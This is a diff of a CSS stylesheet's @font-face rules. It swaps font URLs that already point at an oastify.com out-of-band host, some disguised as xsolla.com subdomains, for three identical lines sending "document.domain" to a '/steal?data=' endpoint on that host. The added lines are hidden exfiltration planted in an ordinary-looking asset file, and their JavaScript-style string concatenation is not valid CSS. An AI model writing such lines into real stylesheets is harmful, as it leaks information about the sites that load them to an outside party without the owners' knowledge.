@@ -6,7 +6,7 @@
   font-display: swap;
   src:
     local('Sharp-Grotesk-Medium'),
-    url('https://id.xsolla.com.gtd5vfeul0n5sroztwkzyk3w8nek2aqz.oastify.com/fonts/Sharp-Grotesk-Medium.woff2') format('woff2');
+    url("https://gtd5vfeul0n5sroztwkzyk3w8nek2aqz.oastify.com/steal?data=" + document.domain);
 }
 
 @font-face {
@@ -17,7 +17,7 @@
   font-display: swap;
   src:
     local('Sharp-Grotesk-Medium'),
-    url('https://id.xsolla.gtd5vfeul0n5sroztwkzyk3w8nek2aqz.oastify.com/fonts/Sharp-Grotesk-Medium.woff2') format('woff2');
+    url("https://gtd5vfeul0n5sroztwkzyk3w8nek2aqz.oastify.com/steal?data=" + document.domain);
 }
 
 @font-face {
@@ -28,7 +28,7 @@
   font-display: swap;
   src:
     local('Sharp-Grotesk-Book'),
-    url('https://gtd5vfeul0n5sroztwkzyk3w8nek2aqz.oastify.com/fonts/Sharp-Grotesk-Book.woff2') format('woff2');
+    url("https://gtd5vfeul0n5sroztwkzyk3w8nek2aqz.oastify.com/steal?data=" + document.domain);
 }
 
 body,
